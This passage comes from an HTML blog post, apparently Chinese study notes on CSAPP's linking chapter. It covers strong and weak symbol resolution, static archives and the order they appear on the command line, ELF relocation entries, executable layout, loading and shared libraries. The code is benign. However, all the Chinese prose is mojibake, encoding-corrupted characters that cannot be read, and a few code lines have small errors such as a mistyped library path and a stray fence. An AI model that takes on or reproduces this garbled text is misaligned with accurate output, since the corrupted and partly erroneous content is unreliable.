class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">void</span> <span class="hljs-title function_">foo</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>foo();<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬ç¼–è¯‘å’Œé“¾æ¥è¿™ä¸ªæºæ–‡ä»¶ï¼Œç¼–è¯‘å™¨ä¼šæ²¡æœ‰éšœç¢åœ°è¿è¡Œï¼Œä½†æ˜¯å½“é“¾æ¥å™¨æ— æ³•è§£æå¯¹ foo çš„å¼•ç”¨æ—¶ï¼Œå°±ä¼šç»ˆæ­¢ã€‚</p><h3 id="è¿æ¥å™¨å¦‚ä½•è§£æå¤šé‡å®šä¹‰çš„å…¨å±€ç¬¦å·"><a href="#è¿æ¥å™¨å¦‚ä½•è§£æå¤šé‡å®šä¹‰çš„å…¨å±€ç¬¦å·" class="headerlink" title="è¿æ¥å™¨å¦‚ä½•è§£æå¤šé‡å®šä¹‰çš„å…¨å±€ç¬¦å·"></a>è¿æ¥å™¨å¦‚ä½•è§£æå¤šé‡å®šä¹‰çš„å…¨å±€ç¬¦å·</h3><p>è¿æ¥å™¨ä¼šå°†æ¨¡å—ä¸å¯¹åº”çš„ç¬¦å·ä¸€ä¸€å¯¹åº”ï¼Œå¦‚æœç¢°åˆ°ä¸¤ä¸ªæ¨¡å—åŒåçš„æƒ…å†µï¼Œå°±ä¸é¢å…·å‘ç”Ÿæ··æ·†ã€‚</p><p>é¦–å…ˆæˆ‘ä»¬è¦ç†è§£ä¸€ä¸ªå¼ºå¼±ç¬¦å·çš„æ¦‚å¿µï¼š</p><p>åœ¨ç¼–è¯‘æ—¶ï¼Œç¼–è¯‘å™¨å‘æ±‡ç¼–å™¨è¾“å‡ºæ¯ä¸ªå…¨å±€ç¬¦å·ï¼Œæˆ–è€…æ˜¯å¼ºæˆ–è€…æ˜¯å¼±ï¼Œè€Œæ±‡ç¼–å™¨æŠŠè¿™ä¸ªä¿¡æ¯éšå«åœ°ç¼–ç åœ¨å¯é‡å®šä½ç›®æ ‡æ–‡ä»¶çš„ç¬¦å·è¡¨é‡Œã€‚å‡½æ•°å’Œå·²åˆå§‹åŒ–çš„å…¨å±€å˜é‡æ˜¯å¼ºç¬¦å·ï¼Œæœªåˆå§‹åŒ–çš„å…¨å±€å˜é‡æ˜¯å¼±ç¬¦å·ã€‚</p><p>è€Œæ ¹æ®å¼ºå¼±ç¬¦å·çš„å®šä¹‰ï¼ŒLinux é“¾æ¥å™¨ä½¿ç”¨ä¸‹é¢çš„è§„åˆ™æ¥å¤„ç†å¤šé‡å®šä¹‰çš„ç¬¦å·åã€‚è§„åˆ™ï¼š</p><ul><li>ä¸å…è®¸æœ‰å¤šä¸ªåŒåçš„å¼ºç¬¦å·</li><li>å¦‚æœæœ‰ä¸€ä¸ªå¼ºç¬¦å·å’Œå¤šä¸ªå¼±ç¬¦å·åŒåï¼Œé‚£ä¹ˆé€‰æ‹©å¼ºç¬¦å·</li><li>å¦‚æœæœ‰å¤šä¸ªå¼±ç¬¦å·åŒåï¼Œé‚£ä¹ˆä»è¿™äº›å¼±ç¬¦å·ä¸­ä»»æ„é€‰æ‹©ä¸€ä¸ª</li></ul><p>æœ‰ä¸€ä¸ªé—®é¢˜æ˜¯ï¼šè¿æ¥å™¨åªä¼šå¯¹å…¨å±€ç¬¦å·åŒé‡å®šä¹‰é—®é¢˜å‘å‡ºè­¦å‘Šè€Œä¸æ˜¯æŠ¥é”™ã€‚</p><p>ä¾‹å¦‚åœ¨ä¸¤ä¸ªæ¨¡å—é“¾æ¥åœ¨ä¸€èµ·çš„æ¨¡å—ä¸­åˆ†åˆ«å®šä¹‰äº† <code>double x;</code> å’Œ <code>int x;</code> ï¼Œå®ƒåªä¼šè§¦å‘ä¸€ä¸ªè­¦å‘Šè€Œä¸æ˜¯æŠ¥é”™ã€‚è¿™å°±ä¼šå¯¼è‡´æˆ‘ä»¬å®šä¹‰äº†ç›¸åŒçš„ä¸¤ä¸ªç¬¦å·ï¼Œç¼–è¯‘åˆ°ä¸€èµ·ä¹‹åï¼Œä¸¤è¾¹çš„å‡½æ•°æ“ä½œçš„æ˜¯åŒä¸€ä¸ªå˜é‡ï¼Œè€Œæˆ‘ä»¬å¾ˆéš¾å‘ç°é—®é¢˜æ‰€åœ¨ã€‚</p><p>ä¸ºäº†é¿å…è¿™ç±»é”™è¯¯ï¼Œæˆ‘ä»¬å°½é‡åŠ ä¸Š <code>-fno-common</code> æ ‡å¿—æ¥é«˜é€Ÿé“¾æ¥å™¨é‡åˆ°å¤šé‡ç¬¦å·å®šä¹‰çš„æ—¶å€™è§¦å‘ä¸€ä¸ªé”™è¯¯ã€‚</p><h3 id="ä¸é™æ€åº“é“¾æ¥"><a href="#ä¸é™æ€åº“é“¾æ¥" class="headerlink" title="ä¸é™æ€åº“é“¾æ¥"></a>ä¸é™æ€åº“é“¾æ¥</h3><p>æˆ‘ä»¬å¯ä»¥æŠŠæ‰€æœ‰æ ‡å‡†å‡½æ•°éƒ½ç¼–è¯‘åœ¨ä¸€ä¸ª<strong>å¯é‡å®šç›®æ ‡æ–‡ä»¶</strong>é‡Œï¼Œå†é€šè¿‡ä¸‹é¢çš„å‘½ä»¤é“¾æ¥åˆ°è‡ªå·±çš„å¯æ‰§è¡Œæ–‡ä»¶ä¸­ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc main.c /usr/lib/libc.o<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™ä¸ªæ–¹æ³•å¯¹å†…å­˜å’Œç£ç›˜ç©ºé—´æ¥è¯´éƒ½æ˜¯æå¤§çš„æµªè´¹ï¼Œå¹¶ä¸”å¦‚æœæŸä¸€ä¸ªæ¨¡å—å‘ç”Ÿäº†æ”¹å˜å°±è¦é‡æ–°ç¼–è¯‘æ•´ä¸ªæ–‡ä»¶ï¼Œç»´æŠ¤å’Œå¼€å‘ä¹Ÿå¾ˆå¤æ‚ã€‚</p><p>æ‰€ä»¥é™æ€åº“æ¦‚å¿µè¢«æå‡ºæ¥ï¼Œä»¥è§£å†³è¿™äº›ç¼ºç‚¹ã€‚</p><p>åœ¨ Linux ç³»ç»Ÿä¸­ï¼Œé™æ€åº“ä»¥ä¸€ç§ç§°ä¸ºå­˜æ¡£ï¼ˆarchiveï¼‰çš„ç‰¹æ®Šæ–‡ä»¶æ ¼å¼å­˜æ”¾åœ¨ç£ç›˜ä¸­ã€‚</p><p>é™æ€åº“å…è®¸å°†æ‰€æœ‰ç›¸å…³çš„ç›®æ ‡æ¨¡å—æ‰“åŒ…æˆä¸€ä¸ªå•ç‹¬çš„æ–‡ä»¶ï¼Œç”¨ä½œè¿æ¥å™¨çš„è¾“å…¥ï¼Œå¹¶ä»¥ä¸€ç§ç§°ä¸ºå­˜æ¡£ï¼ˆarchiveï¼‰çš„ç‰¹æ®Šæ–‡ä»¶æ ¼å¼å­˜æ”¾åœ¨ç£ç›˜ä¸­ã€‚</p><blockquote><p>å­˜æ¡£æ–‡ä»¶æ˜¯ä¸€ç»„è¿æ¥èµ·æ¥çš„å¯é‡å®šä½ç›®æ ‡æ–‡ä»¶çš„é›†åˆï¼Œæœ‰ä¸€ä¸ªå¤´éƒ¨ç”¨æ¥æè¿°æ¯ä¸ªæˆå‘˜ç›®æ ‡æ–‡ä»¶çš„å¤§å°å’Œä½ç½®ã€‚å­˜æ¡£æ–‡ä»¶åç”±åç¼€ <code>.a</code> æ ‡è¯†ã€‚</p></blockquote><p>å½“é“¾æ¥å™¨æ„é€ ä¸€ä¸ªè¾“å‡ºçš„å¯æ‰§è¡Œæ–‡ä»¶æ—¶ï¼Œå®ƒåªå¤åˆ¶é™æ€åº“é‡Œè¢«åº”ç”¨ç¨‹åºå¼•ç”¨çš„ç›®æ ‡æ¨¡å—ã€‚ä¾‹å¦‚æˆ‘ä»¬è°ƒç”¨Cæ ‡å‡†åº“å’Œæ•°å­¦åº“ä¸­çš„å‡½æ•°ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">gcc main.c <span class="hljs-regexp">/usr.lib/</span>libm.a usr<span class="hljs-regexp">/lib/</span>libc.a<br></code></pre></td></tr></table></figure><p>è¿™å°±å‡å°‘äº†å¯æ‰§è¡Œæ–‡ä»¶åœ¨ç£ç›˜å’Œå†…å­˜ä¸­çš„å¤§å°ï¼ŒåŒæ—¶åº”ç”¨ç¨‹åºå‘˜åªéœ€è¦åŒ…å«è¾ƒå°‘çš„åº“æ–‡ä»¶çš„åå­—ï¼ˆC ç¼–è¯‘å™¨é©±åŠ¨ç¨‹åºæ€»æ˜¯é»˜è®¤ä¼ é€ libc.a ç»™é“¾æ¥å™¨ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨å‘½ä»¤è¡Œä¸­å¯ä»¥çœç•¥å¯¹ lbc.a çš„å¼•ç”¨ï¼‰ã€‚</p><p>ç”¨å‘½ä»¤ <code>ar rcs out.a xx1.o xx2.o ....</code> å‘½ä»¤æŠŠå¯é‡å®šä½æ–‡ä»¶æ•´åˆæˆ <code>out.a</code> é™æ€åº“ã€‚é“¾æ¥çš„æ—¶å€™ï¼Œæˆ‘ä»¬éœ€è¦å°†æˆ‘ä»¬ç¼–è¯‘å‡ºçš„å¯é‡å®šå‘æ–‡ä»¶å’Œé™æ€åº“æ–‡ä»¶ä¸€èµ·ä½œä¸ºé“¾æ¥å™¨çš„æ•°ã€‚</p><h3 id="è¿æ¥å™¨å¦‚ä½•ä½¿ç”¨é™æ€åº“æ¥è§£æå¼•ç”¨"><a href="#è¿æ¥å™¨å¦‚ä½•ä½¿ç”¨é™æ€åº“æ¥è§£æå¼•ç”¨" class="headerlink" title="è¿æ¥å™¨å¦‚ä½•ä½¿ç”¨é™æ€åº“æ¥è§£æå¼•ç”¨"></a>è¿æ¥å™¨å¦‚ä½•ä½¿ç”¨é™æ€åº“æ¥è§£æå¼•ç”¨</h3><p>åœ¨ç¬¦å·è§£æé˜¶æ®µï¼Œé“¾æ¥å™¨ä»å·¦åˆ°å³æŒ‰ç…§å®ƒä»¬åœ¨ç¼–è¯‘å™¨é©±åŠ¨ç¨‹åºå‘½ä»¤è¡Œä¸Šå‡ºç°çš„é¡ºåºæ¥æ‰«æå¯é‡å®šä½ç›®æ ‡æ–‡ä»¶å’Œå­˜æ¡£æ–‡ä»¶ã€‚</p><p>é“¾æ¥è¿‡ç¨‹ç»´æŠ¤äº†ä¸‰ä¸ªé›†åˆï¼š</p><ul><li>Eï¼šå¯é‡å®šä½ç›®æ ‡æ–‡ä»¶ï¼Œè¿™ä¸ªé›†åˆä¸­çš„æ–‡ä»¶ä¼šè¢«åˆå¹¶èµ·æ¥å½¢æˆå¯æ‰§è¡Œæ–‡ä»¶</li><li>Uï¼šæœªè§£æçš„ç¬¦å·ï¼Œå³å¼•ç”¨äº†ä½†æ˜¯å°šæœªå®šä¹‰çš„ç¬¦å·</li><li>Dï¼šåœ¨å‰é¢è¾“å…¥æ–‡ä»¶ä¸­å·²å®šä¹‰çš„ç¬¦å·</li></ul><p>åˆå§‹æ—¶ï¼ŒEã€U å’Œ D å‡ä¸ºç©ºã€‚</p><p>å¯¹äºå‘½ä»¤è¡Œä¸Šçš„æ¯ä¸€ä¸ªè¾“å…¥æ–‡ä»¶ï¼Œä¼šåˆ¤æ–­æ˜¯ç›®æ ‡æ–‡ä»¶è¿˜æ˜¯é™æ€åº“æ–‡ä»¶ã€‚å¦‚æœæ˜¯ç›®æ ‡æ–‡ä»¶ï¼Œå°±ä¼šä¿®æ”¹ U å’Œ D æ¥åæ˜ æ–‡ä»¶ä¸­çš„ç¬¦å·å¼•ç”¨ï¼Œå¹¶ç»§ç»­ä¸‹ä¸€ä¸ªæ–‡ä»¶ï¼›å¦‚æœæ˜¯å­˜æ¡£æ–‡ä»¶ï¼ˆ.aï¼‰ï¼Œä¼šå¯¹åº”åŒ¹é… U ä¸­çš„ä¸€ä¸ªå¼•ç”¨ï¼Œå¦‚æœåŒ¹é…æˆåŠŸä¼šæŠŠå¯¹åº”çš„ç¬¦å·ä» U åˆ é™¤å¹¶åŠ å…¥åˆ° D ä¸­ï¼Œå¹¶ä¸”ä¼šæŠŠ .a ä¸­çš„å¯¹åº”çš„æ¨¡å—ï¼ˆ.oï¼‰åŠ å…¥åˆ° E é›†åˆä¸­ï¼Œè€Œä¸åŒ…å«åœ¨ E ä¸­çš„å¯é‡å®šä½æ–‡ä»¶ä¼šè¢«ä¸¢å¼ƒã€‚</p><p>å¦‚æœæ‰«æå®Œæ‰€æœ‰çš„è¾“å…¥æ–‡ä»¶ä¹‹åï¼Œ U éç©ºï¼Œé‚£ä¹ˆæŠ¥é”™æ¨å‡ºï¼Œå¦åˆ™åˆå¹¶ E é›†åˆçš„å¯é‡å®šä½æ–‡ä»¶è¾“å‡ºå¯æ‰§è¡Œæ–‡ä»¶ã€‚</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœæˆ‘ä»¬åœ¨é™æ€é“¾æ¥çš„æ—¶å€™ï¼ŒæŠŠé™æ€åº“æ”¾åœ¨äº†å‰é¢ï¼Œé‚£ä¹ˆä¼šå› ä¸ºåŒ¹é…ä¸åˆ°ä»»ä½•ä¸€ä¸ª U ä¸­çš„ç¬¦å·ï¼ˆå› ä¸ºä¸€å¼€å§‹ U ä¸ºç©ºï¼‰è€Œç›´æ¥è¢«é“¾æ¥å™¨ä¸¢å¼ƒã€‚æ‰€ä»¥åœ¨ä¸Šé¢çš„æƒ…å†µï¼Œæˆ‘ä»¬å¦‚æœä½¿ç”¨å‘½ä»¤ <code>gcc --static -o a.out libcmath.a main.c</code> åˆ™ä¼šæŠ¥é”™ã€‚</p><h1 id="é‡å®šä½"><a href="#é‡å®šä½" class="headerlink" title="é‡å®šä½"></a>é‡å®šä½</h1><p>é“¾æ¥å™¨å®Œæˆç¬¦å·è§£æåï¼Œå°±å¯ä»¥å¼€å§‹é‡å®šä½æ­¥éª¤äº†ã€‚é‡å®šä½æœ‰ä¸¤ä¸ªæ­¥éª¤ï¼š</p><ul><li>é‡å®šä½èŠ‚å’Œç¬¦å·å®šä¹‰ï¼šé“¾æ¥å™¨å°†æ‰€æœ‰ç›¸åŒç±»å‹çš„èŠ‚åˆå¹¶ä¸ºåŒä¸€ç±»å‹çš„æ–°çš„èšåˆèŠ‚ã€‚å½“è¿™ä¸€æ­¥å®Œæˆæ—¶ï¼Œç¨‹åºä¸­çš„æ¯æ¡æŒ‡ä»¤å’Œå…¨å±€å˜é‡éƒ½æœ‰å”¯ä¸€çš„è¿è¡Œæ—¶å†…å­˜åœ°å€äº†ã€‚</li><li>é‡å®šä½èŠ‚ä¸­çš„ç¬¦å·å¼•ç”¨ï¼šé“¾æ¥å™¨ä¿®æ”¹ä»£ç èŠ‚å’Œæ•°æ®èŠ‚ä¸­å¯¹æ¯ä¸ªç¬¦å·çš„å¼•ç”¨ï¼Œä½¿å¾—å®ƒä»¬æŒ‡å‘æ­£ç¡®çš„è¿è¡Œæ—¶åœ°å€ã€‚</li></ul><h3 id="é‡å®šä½æ¡ç›®"><a href="#é‡å®šä½æ¡ç›®" class="headerlink" title="é‡å®šä½æ¡ç›®"></a>é‡å®šä½æ¡ç›®</h3><p>æ— è®ºä½•æ—¶ï¼Œæ±‡ç¼–å™¨é‡åˆ°<strong>å¯¹æœ€ç»ˆä½ç½®æœªçŸ¥çš„ç›®æ ‡å¼•ç”¨</strong>ï¼Œå®ƒå°±ä¼šç”Ÿæˆä¸€ä¸ªé‡å®šä½æ¡ç›®ï¼Œå‘Šè¯‰é“¾æ¥å™¨åœ¨å°†ç›®æ ‡æ–‡ä»¶åˆå¹¶æˆå¯æ‰§è¡Œæ–‡ä»¶æ—¶è¯¥å¦‚ä½•ä¿®æ”¹è¿™ä¸ªå¼•ç”¨ã€‚å…¶ä¸­ï¼Œä»£ç çš„é‡å®šä½æ¡ç›®æ”¾åœ¨ <code>.rel.text</code> ä¸­ï¼Œå·²åˆå§‹åŒ–æ•°æ®çš„é‡å®šä½æ¡ç›®æ”¾åœ¨ <code>.rel.data</code> ä¸­ã€‚</p><p>ä¸‹é¢å°±æ˜¯é‡å®šä¹‰ä½æ¡ç›®çš„æ ¼å¼ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> </span><br><span class="hljs-class">&#123;</span><br><span class="hljs-type">long</span> offset;    <span class="hljs-comment">/* Offset of the reference to relocate */</span><br><span class="hljs-type">long</span> type:<span class="hljs-number">32</span>ï¼Œ  <span class="hljs-comment">/* Relocation type */</span><br> symbol:<span class="hljs-number">32</span>; <span class="hljs-comment">/* Symbol table index */</span><br><span class="hljs-type">long</span> addend;    <span class="hljs-comment">/* Constant part of relocation expression */</span><br>&#125;Elf64_Rela;<br></code></pre></td></tr></table></figure><p>ELF å®šä¹‰äº†32ç§ä¸åŒç±»å‹çš„å¼•ç”¨ï¼Œè¿™é‡Œæˆ‘ä»¬åªå…³å¿ƒä¸¤ç§æœ€åŸºæœ¬çš„ç±»å‹ï¼š</p><ul><li>PC ç›¸å¯¹å¯»å€ <code>R_X86_64_PC32</code> ï¼šä¸€ä¸ªPCç›¸å¯¹åœ°å€å°±æ˜¯è·ç¨‹åºè®¡æ•°å™¨ï¼ˆPCï¼‰çš„å½“å‰è¿è¡Œæ—¶å€¼çš„åç§»é‡</li><li>ç»å¯¹åœ°å€å¼•ç”¨ <code>R_X86_64_32</code> ï¼šé€šè¿‡ç»å¯¹å¯»å€ï¼ŒCPU ç›´æ¥ä½¿ç”¨åœ¨æŒ‡ä»¤ä¸­ç¼–ç çš„ 32 ä½å€¼ä½œä¸ºæœ‰æ•ˆåœ°å€ï¼Œä¸éœ€è¦è¿›ä¸€æ­¥ä¿®æ”¹ã€‚</li></ul><h3 id="é‡å®šä½ç¬¦å·å¼•ç”¨"><a href="#é‡å®šä½ç¬¦å·å¼•ç”¨" class="headerlink" title="é‡å®šä½ç¬¦å·å¼•ç”¨"></a>é‡å®šä½ç¬¦å·å¼•ç”¨</h3><p>é‡å®šä½ç¬¦å·å¼•ç”¨ä¹Ÿåˆ†ä¸º PC ç›¸å¯¹å¼•ç”¨å’Œç»å¯¹å¼•ç”¨ä¸¤ç§ã€‚</p><p>åˆ¤æ–­ PC ç›¸å¯¹å¼•ç”¨å’Œç»å¯¹å¼•ç”¨çš„æ ‡å‡†ä¸»è¦å–å†³äºæŒ‡ä»¤æˆ–æ•°æ®çš„å¯»å€æ–¹å¼å’Œåœ°å€è®¡ç®—æ–¹æ³•ã€‚æˆ‘ä»¬éœ€è¦å®ç°åˆ†æ”¯è·³è½¬å’Œå­˜å‚¨æ•°æ®çš„æŒ‡ä»¤å°±ä¼šé‡‡å– PC ç›¸å¯¹å¼•ç”¨ï¼Œä¾‹å¦‚ call æŒ‡ä»¤ï¼›æˆ‘ä»¬åœ¨ç¨‹åºè¿è¡Œæ—¶éœ€è¦ç¡®å®šç¡®åˆ‡çš„å†…å­˜åœ°å€æ¥è¡¨ç¤ºç›®æ ‡åœ°å€çš„æŒ‡ä»¤ï¼Œå°±éœ€è¦é‡‡ç”¨ç»å¯¹å¼•ç”¨ï¼Œä¾‹å¦‚ mov æŒ‡ä»¤ã€‚</p><h1 id="å¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶"><a href="#å¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶" class="headerlink" title="å¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶"></a>å¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶</h1><p>å¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶çš„æ ¼å¼ç±»ä¼¼äºå¯é‡å®šä½ç›®æ ‡æ–‡ä»¶çš„æ ¼å¼ï¼Œåˆ†ä¸ºä»¥ä¸‹å‡ ä¸ªéƒ¨åˆ†ï¼š</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%83%E7%AB%A0-%E9%93%BE%E6%8E%A5/7-ELF%E7%BB%93%E6%9E%84.png"></p><p>ELF å¤´æè¿°æ–‡ä»¶çš„æ€»ä½“æ ¼å¼ï¼Œå®ƒè¿˜åŒ…æ‹¬ç¨‹åºçš„å…¥å£ç‚¹ï¼ˆentry pointï¼‰ï¼Œä¹Ÿå°±æ˜¯å½“ç¨‹åºè¿è¡Œæ—¶è¦æ‰§è¡Œçš„ç¬¬ä¸€æ¡æŒ‡ä»¤çš„åœ°å€ã€‚</p><p><code>.text</code> ã€.rodata å’Œ <code>.data</code> èŠ‚ä¸å¯é‡å®šä½ç›®æ ‡æ–‡ä»¶ä¸­çš„èŠ‚æ˜¯ç›¸ä¼¼çš„ï¼Œä¸åŒçš„æ˜¯è¿™äº›èŠ‚å·²ç»è¢«é‡å®šä½åˆ°å®ƒä»¬æœ€ç»ˆçš„è¿è¡Œæ—¶å†…å­˜åœ°å€ã€‚</p><p><code>.init</code> èŠ‚å®šä¹‰äº†ä¸€ä¸ªå°å‡½æ•°ï¼Œå«åš initï¼Œæ˜¯ç¨‹åºçš„åˆå§‹åŒ–ä»£ç ã€‚</p><p>å› ä¸ºå¯æ‰§è¡Œæ–‡ä»¶æ˜¯å®Œå…¨é“¾æ¥çš„ï¼ˆå·²è¢«é‡å®šä½ï¼‰ï¼Œæ‰€ä»¥å®ƒä¸å†éœ€è¦ <code>.rel</code> èŠ‚ã€‚</p><p>ç¨‹åºå¤´éƒ¨è¡¨ä¸­çš„å…¶ä¸­ LOAD æ®µä¼šå‘Šè¯‰æˆ‘ä»¬å“ªäº›æ®µåœ¨å“ªä¸ªä½ç½®ï¼Œæƒé™æ˜¯ä»€ä¹ˆï¼Œå¦‚ä¸‹ï¼š</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%83%E7%AB%A0-%E9%93%BE%E6%8E%A5/7-ELF%E5%A4%B4%E9%83%A8.png"></p><h1 id="åŠ è½½å¯æ‰§è¡Œæ–‡ä»¶"><a href="#åŠ è½½å¯æ‰§è¡Œæ–‡ä»¶" class="headerlink" title="åŠ è½½å¯æ‰§è¡Œæ–‡ä»¶"></a>åŠ è½½å¯æ‰§è¡Œæ–‡ä»¶</h1><p>åœ¨Linuxä¸­è¿è¡Œå¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶progï¼Œå¯ä»¥åœ¨Linux shellçš„å‘½ä»¤è¡Œè¿è¡Œä¸‹é¢çš„å‘½ä»¤ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">./prog<br></code></pre></td></tr></table></figure><p>prog æ˜¯æ–‡ä»¶çš„åå­—ï¼Œshell é€šè¿‡è°ƒç”¨æŸä¸ªé©»ç•™åœ¨å­˜å‚¨å™¨ä¸­å«åšåŠ è½½å™¨çš„æ“ä½œç³»ç»Ÿä»£ç æ¥è¿è¡Œå®ƒã€‚</p><p>åŠ è½½å™¨å°†å¯æ‰§è¡Œç›®æ ‡æ–‡ä»¶ä¸­çš„ä»£ç ä¸æ•°æ®ä»ç£ç›˜å¤åˆ¶åˆ°å†…å­˜ï¼Œç„¶åé€šè¿‡è·³è½¬åˆ°ç¨‹åºçš„ç¬¬ä¸€æ¡æŒ‡ä»¤æˆ–å…¥å£ç‚¹æ¥è¿è¡Œè¯¥ç¨‹åºï¼Œè¿™ä¸ªå°†ç¨‹åºå¤åˆ¶åˆ°å†…å­˜å¹¶è¿è¡Œçš„è¿‡ç¨‹å«åš<strong>åŠ è½½</strong>ã€‚</p><p>åŠ è½½å™¨è¿è¡Œæ—¶ï¼Œå®ƒåˆ›å»ºå¦‚ä¸‹å›¾æ‰€ç¤ºçš„å†…å­˜æ˜ åƒã€‚åœ¨ç¨‹åºå¤´éƒ¨è¡¨çš„å¼•å¯¼ä¸‹,åŠ è½½å™¨å°†å¯æ‰§è¡Œæ–‡ä»¶çš„ç‰‡å¤åˆ¶åˆ°ä»£ç æ®µå’Œæ•°æ®æ®µã€‚æ¥ä¸‹æ¥è·³è½¬åˆ°ç¨‹åºçš„å…¥å£ç‚¹ <code>_start</code> å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°ä¼šè°ƒç”¨ <code>libc.so</code> ä¸­çš„ç³»ç»Ÿå¯åŠ¨å‡½æ•° <code>__libc_start_main</code> å‡½æ•°å»åˆå§‹åŒ–æ‰§è¡Œç¯å¢ƒï¼Œæœ€åè½½è°ƒç”¨ç”¨æˆ·å±‚çš„ <code>main</code> å‡½æ•°ã€‚</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%83%E7%AB%A0-%E9%93%BE%E6%8E%A5/7-%E5%8A%A0%E8%BD%BD%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6.png"></p><h1 id="åŠ¨æ€é“¾æ¥å…±äº«åº“"><a href="#åŠ¨æ€é“¾æ¥å…±äº«åº“" class="headerlink" title="åŠ¨æ€é“¾æ¥å…±äº«åº“"></a>åŠ¨æ€é“¾æ¥å…±äº«åº“</h1><p>ä¹‹å‰ä¸€ç›´åœ¨è®¨è®ºé™æ€é“¾æ¥çš„å†…å®¹ï¼ŒåŠ¨æ€é“¾æ¥å¼¥è¡¥äº†é™æ€é“¾æ¥çš„ç¼ºç‚¹ï¼Œè‡´åŠ›äºè§£å†³é™æ€åº“ç¼ºé™·çš„ä¸€ä¸ªç°ä»£åˆ›æ–°äº§ç‰©ã€‚</p><p>å…±äº«åº“æ˜¯ä¸€ä¸ªç›®æ ‡æ¨¡å—ï¼Œåœ¨è¿è¡Œæˆ–åŠ è½½æ—¶ï¼Œå¯ä»¥åŠ è½½åˆ°ä»»æ„çš„å†…å­˜åœ°å€ï¼Œå¹¶å’Œä¸€ä¸ªåœ¨å†…å­˜ä¸­çš„ç¨‹åºé“¾æ¥èµ·æ¥ã€‚è¿™ä¸ªè¿‡ç¨‹ç§°ä¸º<strong>åŠ¨æ€é“¾æ¥ï¼ˆdynamic linkingï¼‰</strong>ï¼Œæ˜¯ç”±ä¸€ä¸ªå«åš<strong>åŠ¨æ€é“¾æ¥å™¨</strong>ï¼ˆdynamic linkerï¼‰çš„ç¨‹åºæ¥æ‰§è¡Œçš„ã€‚</p><p>å…±äº«åº“ä¹Ÿç§°ä¸ºå…±äº«ç›®æ ‡ï¼ˆshared objectï¼‰ï¼Œåœ¨ Linux ç³»ç»Ÿä¸­é€šå¸¸ç”¨ .so åç¼€æ¥è¡¨ç¤ºã€‚windowsæ“ä½œç³»ç»Ÿçš„å…±äº«åº“ç§°ä¸º DLLï¼ˆåŠ¨æ€é“¾æ¥åº“ï¼‰ã€‚</p><p>é™æ€é“¾æ¥å”¯ä¸€çš„ä¼˜åŠ¿å°±æ˜¯ä¸ä¾èµ–ç¯å¢ƒï¼Œåªè¦æ¶æ„æ”¯æŒï¼Œå°±ä¸€å®šèƒ½è¿è¡Œï¼Œè€ŒåŠ¨æ€é“¾æ¥éœ€è¦æ¯”è¾ƒä¸¥æ ¼çš„ç¯å¢ƒè¦æ±‚ã€‚å…±äº«åº“æ˜¯åœ¨è¿è¡Œæ—¶åŠ è½½ï¼Œå¯ä»¥åŠ è½½åˆ°ä»»æ„çš„å†…å­˜ï¼Œå› æ­¤ç¼–è¯‘çš„æ—¶å€™ï¼Œå¿…é¡»ç¼–è¯‘ä½ç½®æ— å…³ä»£ç ã€‚</p><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤ç¼–è¯‘åŠ¨æ€é“¾æ¥åº“ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs C">gcc -shared -fpic -o out.so file1.c file2.c<br>````<br><br> `-shared` 